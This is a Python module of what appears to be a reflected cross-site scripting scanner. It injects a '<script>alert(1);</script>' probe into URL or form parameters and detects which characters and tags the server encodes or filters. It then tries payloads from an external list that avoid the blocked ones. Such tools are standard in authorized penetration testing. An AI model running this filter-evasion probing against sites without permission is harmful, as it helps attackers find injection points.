import requests
import re
from cores.utils import *
from cores import validate
from cores import controller
from enum import Enum


class XCheck(Enum):
    not_vulnerable = -1
    vulnerable = 0
    payload_not_found = 1
    payload_is_blocked = 2
    payload_encoded = 3
    payload_filtered = 4


def gen_rand_payload():
    import hashlib
    import random
    import string
    my_string = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(16))
    return hashlib.md5(my_string.encode('utf-8')).hexdigest()


def send_request(url, headers, params, body, point_inject, args):
    head = "".join(gen_rand_payload()[0:6])
    tail = "".join(gen_rand_payload()[0:6])
    payload = head + body + tail
    size_payload = len(payload)
    res_payload = ""
    status = XCheck.payload_not_found
    params.update({point_inject: payload})

    if args.method == "GET":
        r = requests.get(url, headers=headers, params=params)
    else:
        r = requests.post(url, headers=headers, data=params)

    try:
        if re.search(re.escape(payload), r.text):
            status = XCheck.vulnerable
        elif not re.search(head, r.text) and not re.search(tail, r.text):
            status = XCheck.payload_is_blocked


    except AttributeError:
        status = XCheck.payload_is_blocked
    # Analysis payload change
    if status != XCheck.payload_is_blocked and status != XCheck.vulnerable:
        find_head = re.search(head, r.text)
        find_tail = re.search(tail, r.text)
        size_res_payload = find_tail.start() - find_head.start()
        res_payload = r.text[find_head.end():find_tail.start()]
        # TODO site has both filter and encoder
        # TODO multiple positions in response
        if size_res_payload > size_payload:
            status = XCheck.payload_encoded
        else:
            status = XCheck.payload_filtered

    return status, res_payload


def analysis(url, headers, params, point_inject, args):
    body = "<script>alert(1);</script>"
    blacklist = []
    status, res_payload = send_request(url, headers, params, body, point_inject, args)

    if status == XCheck.payload_encoded:
        print_debug("Server encoded request", body, res_payload)
        body = "< > / ; \' \" ( ) ="
        status, res_payload = send_request(url, headers, params, body, point_inject, args)

        if status == XCheck.payload_encoded:
            blacklist = [value for value in body.split(" ") if value not in res_payload]
            print_info(f"Encoded characters: {blacklist}")

    elif status == XCheck.payload_filtered:
        print_info(f"Checking blacklist tags and keywords")
        print_debug("Server filtered request", body, res_payload)
        body = "<script> </script> <img /> <div> </div> <svg> <eval <frame <form <iframe <xmp"
        status, res_payload = send_request(url, headers, params, body, point_inject, args)

        if status == XCheck.payload_filtered:
            blacklist = [value for value in body.split(" ") if value not in res_payload]
            print_info(f"Blacklisted tags: {blacklist}")

    elif status == XCheck.payload_is_blocked:
        print_blocked()
        print(res_payload)
        # TODO find if any keyword / character is blocked. Very hard way

    else:
        print_vulnerable(url, body, point_inject)
        return

    print_info("Trying payload that does not contain blacklisted characters")
    import resources
    from cores import progress

    path = resources.__path__[0]
    ignored, checking = 0, 0

    with open(path + "/xss_payloads") as f_payload:
        for line in f_payload.readlines():
            payload = line.replace("\n", "")
            for x in blacklist:
                if x in line:
                    payload = ""
                    break
            if payload:
                checking += 1
                progress.progress_bar(f"Checking: {checking} Ignored: {ignored}")
                status, res_payload = send_request(url, headers, params, payload, point_inject, args)
                if status == XCheck.vulnerable:
                    print_vulnerable(url, payload, point_inject)
                    return
            else:
                ignored += 1
    # TODO analysis if payload is in script tag
    # 6 of pentesterlab's web for pentester -> Wrong payload in <script>
    # 7: similar payload (-alert(1)-) caused false positive for other websites
    # if status != XCheck.vulnerable:
    #     body = "<'\"" + gen_rand_payload() + ";/>"
    #     status, resp_payload = send_request(url, headers, params, body, point_inject, args)
    # OLD BLOCK OF CODE
    #
    # try:
    #     if re.search(re.escape(payload), r.text):
    #         print_heuristic(payload)
    #     else:
    #         print_not_vulnerable(url)
    # except AttributeError:
    #     print_not_vulnerable(url)
    if status == XCheck.not_vulnerable:
        print_not_vulnerable(url)


def create_session(args):
    # session = requests.Session()
    # https://stackoverflow.com/a/51904567
    # if args.cookie:
    #     session.cookies.set(args.cookie)

    # TODO add more for session

    for url in validate.check_target(args.url, args.list_urls):
        url = url.replace("\n", "")
        print()
        print_verbose(f"Checking \033[94m{url}\033[0m")
        if args.method == "GET":
            if not args.data:
                result = controller.parse_param_from_url(url)
                if result:
                    url, params = result
                else:
                    raise ValueError("No parameter for GET method")
            else:
                params = args.data

        else:
            if not args.data:
                raise ValueError("No parameter for Post method")
            else:
                params = controller.parse_params([args.data])

        if not args.point_inject:
            for key in params.keys():
                analysis(url, args.headers, params, key, args)
        else:
            for key in args.point_inject:
                analysis(url, args.headers, params, key, args)
